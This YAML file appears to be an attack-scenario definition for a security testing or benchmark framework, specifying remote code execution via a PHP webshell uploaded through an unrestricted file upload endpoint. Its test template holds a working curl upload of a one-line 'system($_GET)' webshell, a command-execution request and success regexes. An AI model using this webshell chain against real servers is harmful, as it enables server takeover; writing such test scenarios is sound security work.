id: rce_via_webshell
description: >
  Achieve remote code execution by uploading a PHP webshell through an
  unauthenticated, unrestricted file upload endpoint and then requesting the
  uploaded file to execute arbitrary OS commands.
compatible_vuln_patterns:
  - file_upload_bypass
success_criteria:
  description: >
    After uploading the PHP webshell, an HTTP request to the uploaded file's
    URL with a cmd parameter returns OS command output — uid/gid information,
    file contents, or process listings.
  output_pattern: 'uid=\d+|gid=\d+|root:|www-data|Linux'
test_template: |
  # Step 1: upload the webshell
  curl -s -X POST "http://target:{{port}}/{{endpoint}}" \
    -F "{{file_parameter}}=@-;filename=goe_shell.php;type=application/octet-stream" \
    <<< '<?php system($_GET["cmd"]); ?>'
  # Step 2: execute via webshell
  curl -s "http://target:{{port}}/uploads/goe_shell.php?cmd=id" \
    | grep -E 'uid=[0-9]+'
notes: >
  Requires Apache/PHP runtime. Uploaded files must land in a web-accessible
  directory (e.g. /var/www/html/uploads/) that Apache serves without PHP
  execution restrictions. The upload endpoint must accept arbitrary file
  extensions and content types without validation. No database dependency.
